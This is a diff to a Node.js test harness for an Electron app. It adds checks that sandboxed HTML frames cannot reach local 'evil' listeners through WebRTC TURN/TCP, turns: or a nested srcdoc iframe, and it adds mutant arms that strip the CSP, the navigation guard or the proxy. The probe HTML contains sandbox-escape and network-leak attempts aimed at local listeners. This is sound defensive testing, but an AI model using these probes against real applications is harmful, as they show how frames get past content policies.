@@ -7,6 +7,7 @@
 //   policy        a COPY whose frame document lost its policy <meta>         → I1 must go RED (frame reaches the local listener)
 //   nav           a COPY whose main-process navigation guard never fires      → I2 must go RED (a frame navigation reaches the listener)
 //   webrtc        a COPY whose app window allows non-proxied UDP              → I6 must go RED (a STUN request from the frame reaches a UDP listener)
+//   webrtc-tcp    a COPY without the black-hole proxy on the app window       → I6b must go RED (TURN/TCP, turns:, nested srcdoc frame reach raw TCP listeners)
 //   sandbox-api   a COPY whose frame lost its `sandbox` attribute (same-origin) → I3 must go RED (the frame reads the app's API object)
 //   sandbox-loop  the same copy, a looping bloc                               → I4 must go RED (the window freezes)
 // A mutant arm passes only if its named clause is RED, every control GREEN, and its OTHER evaluated I-clauses GREEN (it removes ONE guard).
@@ -24,7 +25,7 @@ const argv = process.argv.slice(2);
 const flag = (n, d) => { const i = argv.indexOf(n); return i >= 0 ? argv[i + 1] : d; };
 const APP_DIR = argv[0] && !argv[0].startsWith('--') ? fs.realpathSync(argv[0]) : null;
 const LIVE_HOME = flag('--live-home', null);
-const ARMS = (flag('--arms', 'real,policy,nav,webrtc,sandbox-api,sandbox-loop')).split(',');
+const ARMS = (flag('--arms', 'real,policy,nav,webrtc,webrtc-tcp,sandbox-api,sandbox-loop')).split(',');
 const refuse = (m) => { console.log(`REFUSED: ${m}`); process.exit(3); };
 if (!APP_DIR) refuse('no <app-dir>');
 if (!LIVE_HOME) refuse('--live-home missing (needed to protect the live ~/.claude* and to prove nothing there moved)');
@@ -114,9 +115,11 @@ async function startEvil() {
   const srv = http.createServer((req, res) => { hits.push(req.url); res.writeHead(200, { 'content-type': 'text/plain', 'access-control-allow-origin': '*' }); res.end('evil'); });
   srv.on('connection', () => { conns++; });
   srv.on('upgrade', (req, sock) => { hits.push(`UPGRADE ${req.url}`); sock.destroy(); });
+  const tcp = {}; const tcpPorts = {}; // raw TCP listeners: a TURN/TCP or turns: connection from a frame lands here, per probe
+  for (const tag of ['turn', 'turns', 'nested']) { tcp[tag] = 0; const t = net.createServer((sock) => { tcp[tag]++; sock.on('error', () => {}); sock.destroy(); }); await new Promise((r) => t.listen(0, '127.0.0.1', r)); tcpPorts[tag] = t.address().port; srv.on('close', () => t.close()); }
   let udp = 0; const us = dgram.createSocket('udp4'); us.on('message', () => { udp++; }); // WebRTC/STUN is not governed by the frame's policy: a UDP listener sees it
   await new Promise((r) => us.bind(0, '127.0.0.1', r));
-  return new Promise((res) => srv.listen(0, '127.0.0.1', () => res({ srv, port: srv.address().port, udpPort: us.address().port, udp: () => udp, hits, conns: () => conns, reset: () => { hits.length = 0; conns = 0; udp = 0; }, close: () => { srv.close(); us.close(); } })));
+  return new Promise((res) => srv.listen(0, '127.0.0.1', () => res({ srv, port: srv.address().port, udpPort: us.address().port, udp: () => udp, tcp, tcpPorts, hits, conns: () => conns, reset: () => { hits.length = 0; conns = 0; udp = 0; for (const k of Object.keys(tcp)) tcp[k] = 0; }, close: () => { srv.close(); us.close(); } })));
 }
 
 // ── seeding: a real git repo + registered worktree, the PINNED scratch account, a stub `claude` ────
@@ -154,7 +157,9 @@ const fence = (info, body) => '```' + info + '\n' + body + '\n```';
 // ── the blocs ─────────────────────────────────────────────────────────────────────────────────────
 const THEME_BLOC = `<div id="card" style="width:50%;height:200px;background:var(--bloc-accent);color:var(--bloc-surface)">card</div>
 <script>parent.postMessage({__probe:'theme',r:{accent:getComputedStyle(document.getElementById('card')).backgroundColor,fg:getComputedStyle(document.body).color,fs:getComputedStyle(document.body).fontSize,bg:getComputedStyle(document.body).backgroundColor,fgVar:getComputedStyle(document.documentElement).getPropertyValue('--bloc-fg').trim()}},'*')</script>`;
-const isoBloc = (evil, port, udpPort) => `<div id="m" style="height:60px;color:var(--bloc-accent)">isolation probe</div>
+const turnJs = (port, scheme) => `var pc=new RTCPeerConnection({iceServers:[{urls:'${scheme}:127.0.0.1:${port}?transport=tcp',username:'S3CR3T',credential:'c'}],iceTransportPolicy:'relay'});pc.createDataChannel('x');pc.createOffer().then(function(o){return pc.setLocalDescription(o)});`;
+const attrEsc = (x) => x.replace(/&/g, '&amp;').replace(/"/g, '&quot;');
+const isoBloc = (evil, port, udpPort, tp) => `<div id="m" style="height:60px;color:var(--bloc-accent)">isolation probe</div>
 <link rel="preconnect" href="${evil}"><link rel="prefetch" href="${evil}/prefetch"><link rel="stylesheet" href="${evil}/css">
 <style>#m{background:url(${evil}/cssimg)}</style><img src="${evil}/img">
 <script>(function(){var r={};function t(f){try{return f()}catch(e){return 'ERR '+e.name}}
@@ -168,7 +173,9 @@ t(function(){var x=new XMLHttpRequest();x.open('GET','${evil}/xhr');x.send()});
 t(function(){new WebSocket('ws://127.0.0.1:${port}/ws')});
 t(function(){navigator.sendBeacon('${evil}/beacon','x')});
 t(function(){var pc=new RTCPeerConnection({iceServers:[{urls:'stun:127.0.0.1:${udpPort}'}]});pc.createDataChannel('x');pc.createOffer().then(function(o){return pc.setLocalDescription(o)})});
-setTimeout(function(){parent.postMessage({__probe:'iso',r:r},'*')},900)})()</script>`;
+t(function(){${turnJs(tp.turn, 'turn')}});t(function(){${turnJs(tp.turns, 'turns')}});
+setTimeout(function(){parent.postMessage({__probe:'iso',r:r},'*')},900)})()</script>
+<iframe srcdoc="${attrEsc('<script>' + turnJs(tp.nested, 'turn') + '</script>')}" style="display:none"></iframe>`;
 const navBloc = (evil) => `<meta http-equiv="refresh" content="1;url=${evil}/nav-meta"><a id="lnk" href="${evil}/nav-link" target="_top">x</a><div style="height:30px">navigation probe</div>
 <script>setTimeout(function(){try{location.href='${evil}/nav-js'}catch(e){}},300);
 setTimeout(function(){try{window.open('${evil}/popup')}catch(e){}},300);
@@ -183,10 +190,14 @@ function clause(arm, name, ok, detail) { results.push({ arm, clause: name, ok: !
 function saveShot(name, buf) { fs.mkdirSync(OUT, { recursive: true }); const f = path.join(OUT, name); fs.writeFileSync(f, buf); shots.push({ file: f, md5: md5(buf) }); return f; }
 
 // ── the mutants: ONE string in a disposable COPY of the built app ─────────────────────────────────
+// The black-hole proxy (B1) is a BACKSTOP for loopback-TCP channels: with it on, a removed CSP / navigation guard can no longer reach the listener, so those two
+// arms remove it as well (`PROXY_OFF`) to isolate their own guard — and I6b (TURN/TCP) is then allowed to go red with it.
+const PROXY_OFF = { dir: 'dist-electron', from: 'setProxy({proxyRules:', to: 'setProxy({proxyRulesX:' };
 const MUTANTS = {
-  policy: { clause: 'I1', dir: 'dist/assets', from: '<meta http-equiv="Content-Security-Policy" content="', to: '<meta http-equiv="X-Bloc-Mutant-No-Policy" content="' },
+  policy: { clause: 'I1', dir: 'dist/assets', from: '<meta http-equiv="Content-Security-Policy" content="', to: '<meta http-equiv="X-Bloc-Mutant-No-Policy" content="', also: [PROXY_OFF] },
+  'webrtc-tcp': { clause: 'I6b', dir: 'dist-electron', from: 'setProxy({proxyRules:', to: 'setProxy({proxyRulesX:' },
   webrtc: { clause: 'I6', dir: 'dist-electron', from: 'setWebRTCIPHandlingPolicy("disable_non_proxied_udp")', to: 'setWebRTCIPHandlingPolicy("default")' },
-  nav: { clause: 'I2', dir: 'dist-electron', from: '"will-frame-navigate"', to: '"will-frame-navigatX"' },
+  nav: { clause: 'I2', dir: 'dist-electron', from: '"will-frame-navigate"', to: '"will-frame-navigatX"', also: [PROXY_OFF] },
   'sandbox-api': { clause: 'I3', dir: 'dist/assets', from: 'sandbox:"allow-scripts"', to: '"data-x":"allow-scripts"' },
   'sandbox-loop': { clause: 'I4', dir: 'dist/assets', from: 'sandbox:"allow-scripts"', to: '"data-x":"allow-scripts"' },
 };
@@ -196,13 +207,17 @@ function makeMutantCopy(armDir, m) {
   fs.copyFileSync(path.join(APP_DIR, 'package.json'), path.join(copy, 'package.json'));
   fs.symlinkSync(path.join(APP_DIR, 'node_modules'), path.join(copy, 'node_modules'));
   for (const extra of ['build']) if (fs.existsSync(path.join(APP_DIR, extra))) fs.symlinkSync(path.join(APP_DIR, extra), path.join(copy, extra));
-  const files = walk(path.join(copy, m.dir)).filter((f) => f.endsWith('.js'));
-  const hit = files.map((f) => ({ f, n: fs.readFileSync(f, 'utf8').split(m.from).length - 1 })).filter((x) => x.n > 0);
-  if (hit.length !== 1 || hit[0].n !== 1) throw new Error(`mutation string ${JSON.stringify(m.from)} found ${JSON.stringify(hit)} — must be exactly 1 occurrence in 1 file`);
-  const before = fs.readFileSync(hit[0].f, 'utf8');
-  fs.writeFileSync(hit[0].f, before.replace(m.from, m.to));
-  const after = fs.readFileSync(hit[0].f, 'utf8');
-  return { copy, file: path.relative(copy, hit[0].f), beforeMd5: md5(before), afterMd5: md5(after), changed: before !== after && after.split(m.to).length - 1 === 1 };
+  const proofs = [];
+  for (const mm of [m, ...(m.also ?? [])]) {
+    const files = walk(path.join(copy, mm.dir)).filter((f) => f.endsWith('.js'));
+    const hit = files.map((f) => ({ f, n: fs.readFileSync(f, 'utf8').split(mm.from).length - 1 })).filter((x) => x.n > 0);
+    if (hit.length !== 1 || hit[0].n !== 1) throw new Error(`mutation string ${JSON.stringify(mm.from)} found ${JSON.stringify(hit)} — must be exactly 1 occurrence in 1 file`);
+    const before = fs.readFileSync(hit[0].f, 'utf8');
+    fs.writeFileSync(hit[0].f, before.replace(mm.from, mm.to));
+    const after = fs.readFileSync(hit[0].f, 'utf8');
+    proofs.push({ from: mm.from, to: mm.to, file: path.relative(copy, hit[0].f), beforeMd5: md5(before), afterMd5: md5(after), changed: before !== after && after.split(mm.to).length - 1 === 1 });
+  }
+  return { copy, proofs, changed: proofs.every((x) => x.changed) };
 }
 
 // ── one arm ───────────────────────────────────────────────────────────────────────────────────────
@@ -253,7 +268,7 @@ async function runArm(arm, evil) {
     const rc_ = await cdp.send('Page.getResourceContent', { frameId, url: bundle });
     const served = Buffer.from(rc_.content, rc_.base64Encoded ? 'base64' : 'utf8');
     clause(arm, 'ctl/app-identity-bundle', md5(served) === md5(fs.readFileSync(onDisk)), `renderer bundle ${path.basename(bundle)} as served md5 ${md5(served)} == the file in ${appDir}/dist (${md5(fs.readFileSync(onDisk))})`);
-    if (mut) clause(arm, 'ctl/mutation-applied', mutProof.changed && mutProof.beforeMd5 !== mutProof.afterMd5, `${JSON.stringify(mut.from)} -> ${JSON.stringify(mut.to)} exactly once in ${mutProof.file} (md5 ${mutProof.beforeMd5} -> ${mutProof.afterMd5}), applied to a disposable COPY`);
+    if (mut) clause(arm, 'ctl/mutation-applied', mutProof.changed, mutProof.proofs.map((x) => `${JSON.stringify(x.from)} -> ${JSON.stringify(x.to)} exactly once in ${x.file} (md5 ${x.beforeMd5} -> ${x.afterMd5})`).join(' + ') + ', applied to a disposable COPY');
 
     // the page's seams: what a bloc says (probes) + a switch that drops height reports (the failure-fallback arm)
     await cdp.eval(`window.__probes = {}; window.__dropHeights = false;
@@ -356,13 +371,18 @@ async function runArm(arm, evil) {
     const I = {};
     if (arm !== 'sandbox-loop') {
       evil.reset();
-      await inject(evText('ISO-MARK\n' + fence('html-render title="Isolation"', isoBloc(E, evil.port, evil.udpPort))));
+      await inject(evText('IMG-MARK ![prose](' + E + '/prose.png)'));
+      await sleep(2500);
+      const imgHits = evil.hits.filter((u) => u === '/prose.png').length;
+      clause(arm, 'S1/side-effect-prose-remote-image-load', true, `MEASURED side effect of the proxy: a remote markdown image in the app window reached the listener ${imgHits}x (0 = it no longer loads; the webrtc-tcp arm, proxy removed, shows the instrument sees it)`);
+      evil.reset();
+      await inject(evText('ISO-MARK\n' + fence('html-render title="Isolation"', isoBloc(E, evil.port, evil.udpPort, evil.tcpPorts))));
       const r = await waitFor(() => probe('iso'), 30000, 'the isolation probe report');
       await sleep(4000);
       const net = evil.hits.filter((u) => !/^\/nav/.test(u) && !/^\/popup/.test(u));
       I.I1 = { ok: net.length === 0, detail: `listener ${E} saw ${net.length} request(s) from the frame's fetch/xhr/img/css/prefetch/beacon/websocket: ${JSON.stringify(net)}; frame says fetch=${r.fetch}` };
       I.I6 = { ok: evil.udp() === 0, detail: `UDP datagrams at the listener after an RTCPeerConnection with a stun: server on it: ${evil.udp()}` };
-      clause(arm, 'X1/preconnect-opens-no-connection', evil.conns() === 0, `raw TCP connections to the listener after <link rel=preconnect>: ${evil.conns()} (requests ${evil.hits.length})`);
+      I.I6b = { ok: evil.tcp.turn === 0 && evil.tcp.turns === 0 && evil.tcp.nested === 0, detail: `TCP connections at the listeners after RTCPeerConnection iceServers turn:…?transport=tcp ${evil.tcp.turn}, turns: ${evil.tcp.turns}, and the same from a NESTED <iframe srcdoc> inside the bloc ${evil.tcp.nested} (the policy cannot stop these: Chromium does not apply connect-src to iceServers)` };
       I.I3 = { ok: /^ERR/.test(r.parentApi) && /^ERR/.test(r.parentDoc) && r.ownApi === 'undefined/undefined' && r.origin === 'null' && /^ERR/.test(r.cookie), detail: `from inside the frame: typeof parent.orchestra = ${r.parentApi}; parent.document = ${r.parentDoc}; own orchestra/require = ${r.ownApi}; origin = ${r.origin}; cookie = ${r.cookie}` };
       evil.reset();
       await inject(evText('NAV-MARK\n' + fence('html-render title="Navigation"', navBloc(E))));
@@ -406,8 +426,8 @@ async function runArm(arm, evil) {
     }
 
     // ── verdicts of the isolation clauses ──
-    const names = { I6: 'I6/webrtc-stun', I5: 'I5/message-flood', I1: 'I1/frame-without-policy-reaches-a-local-listener', I2: 'I2/navigation-guard-removed-reaches-the-listener', I3: 'I3/same-origin-frame-reads-the-api-object', I4: 'I4/same-origin-looping-frame-freezes-the-window' };
-    const named = { I6: 'WebRTC sends no UDP', I5: 'a flooding frame leaves the window responsive', I1: 'policy blocks every network path', I2: 'a frame navigation goes nowhere', I3: 'parent + app API unreachable from the frame', I4: 'a looping frame leaves the window responsive' };
+    const names = { I6b: 'I6b/webrtc-turn-tcp', I6: 'I6/webrtc-stun', I5: 'I5/message-flood', I1: 'I1/frame-without-policy-reaches-a-local-listener', I2: 'I2/navigation-guard-removed-reaches-the-listener', I3: 'I3/same-origin-frame-reads-the-api-object', I4: 'I4/same-origin-looping-frame-freezes-the-window' };
+    const named = { I6b: 'WebRTC TURN/TCP, turns: and a nested frame reach nothing', I6: 'WebRTC sends no UDP', I5: 'a flooding frame leaves the window responsive', I1: 'policy blocks every network path', I2: 'a frame navigation goes nowhere', I3: 'parent + app API unreachable from the frame', I4: 'a looping frame leaves the window responsive' };
     for (const k of Object.keys(I)) clause(arm, `${k}/${named[k]}`, I[k].ok, `${names[k].split('/')[1]} :: ${I[k].detail}`);
     fs.writeFileSync(path.join(OUT, `${arm}-hits.json`), JSON.stringify({ hits: evil.hits, conns: evil.conns(), I }, null, 2));
     if (arm !== 'sandbox-loop') {
@@ -458,7 +478,7 @@ const same = JSON.stringify(before) === JSON.stringify(after);
 clause('rig', 'ctl/live-claude-dirs-untouched', same, `${Object.keys(before).length} live ~/.claude* dirs, symlink-set + mcpServers hashes ${same ? 'identical before/after' : 'CHANGED: ' + JSON.stringify({ before, after })}`);
 
 // ── verdict ───────────────────────────────────────────────────────────────────────────────────────
-const isI = (c) => /^I\d\//.test(c.clause);
+const isI = (c) => /^I\d+b?\//.test(c.clause);
 const isCtl = (c) => /^(ctl|rig)\//.test(c.clause);
 const lines = [];
 let rc = 0;
@@ -474,7 +494,7 @@ for (const arm of ARMS) {
     const want = MUTANTS[arm].clause;
     const named = mine.find((c) => c.clause.startsWith(want + '/'));
     // removing the sandbox also re-enables popups and top navigation (that is part of its job), so I2 may follow it
-    const allowed = arm === 'sandbox-api' ? ['I2'] : [];
+    const allowed = arm === 'sandbox-api' ? ['I2'] : (arm === 'policy' || arm === 'nav') ? ['I6b'] : [];
     const others = mine.filter((c) => isI(c) && !c.clause.startsWith(want + '/') && !allowed.some((a) => c.clause.startsWith(a + '/')) && !c.ok).map((c) => c.clause);
     const ok = !!named && !named.ok && ctlRed.length === 0 && others.length === 0;
     lines.push(`${arm}: ${ok ? 'MUST-FAIL CONFIRMED' : 'NOT CONFIRMED'} — ${want} ${named ? (named.ok ? 'stayed GREEN' : 'RED') : 'not evaluated'}; other I-clauses red: ${others.join(',') || 'none'}; controls red: ${ctlRed.join(',') || 'none'}`);
